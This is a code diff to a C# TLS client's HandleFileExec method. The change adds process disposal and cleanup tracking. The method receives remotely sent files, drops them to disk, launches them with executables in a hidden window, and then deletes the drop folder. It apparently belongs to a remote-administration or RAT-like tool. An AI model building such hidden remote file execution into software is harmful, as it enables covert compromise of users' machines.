@@ -1341,6 +1341,8 @@ internal class TlsClient : IDisposable
     private async Task HandleFileExec(string data, CancellationToken ct)
     {
         string? dropDir = null;
+        Process? proc = null;
+        bool cleanupStarted = false;
         try
         {
             var fileData = JsonSerializer.Deserialize(data, SeroJson.Default.RemoteFileExecData);
@@ -1365,7 +1367,7 @@ internal class TlsClient : IDisposable
                 WindowStyle     = isExe ? ProcessWindowStyle.Hidden : ProcessWindowStyle.Normal,
             };
 
-            var proc = Process.Start(psi);
+            proc = Process.Start(psi);
             // For non-exe files (images, docs), null proc = UWP/shell handled it = success
             bool launched = proc != null || !isExe;
             var result = launched
@@ -1384,6 +1386,7 @@ internal class TlsClient : IDisposable
 
             if (proc != null)
             {
+                cleanupStarted = true;
                 // Wait up to 3 min for non-exe (image viewers, docs) before cleaning up
                 var timeout = isExe ? TimeSpan.FromSeconds(30) : TimeSpan.FromMinutes(3);
                 _ = Task.Run(async () =>
@@ -1399,6 +1402,7 @@ internal class TlsClient : IDisposable
             }
             else if (!isExe)
             {
+                cleanupStarted = true;
                 // UWP or shell-launched: wait before cleanup so file is loaded by the app
                 _ = Task.Run(async () =>
                 {
@@ -1409,6 +1413,7 @@ internal class TlsClient : IDisposable
         }
         catch
         {
+            if (!cleanupStarted) proc?.Dispose();
             try { if (dropDir != null) Directory.Delete(dropDir, true); } catch { }
         }
     }
